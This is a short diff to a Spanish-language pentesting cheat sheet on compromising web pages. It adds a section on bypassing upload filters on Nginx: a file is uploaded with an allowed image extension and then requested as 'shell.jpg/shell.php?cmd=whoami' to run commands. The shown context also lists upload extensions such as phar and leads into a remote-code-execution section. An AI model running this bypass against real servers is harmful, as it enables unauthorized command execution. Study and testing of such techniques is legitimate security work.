@@ -105,6 +105,16 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 * phar
 ```
 
+## Bypass Web
+
+```bash 
+# Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiamos al formato php y ejecutamos los comandos 
+
+❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami
+
+	# shell.jpg = Extension que nos deja subir la web
+```
+
 ## RCE en Web
 
 ```php
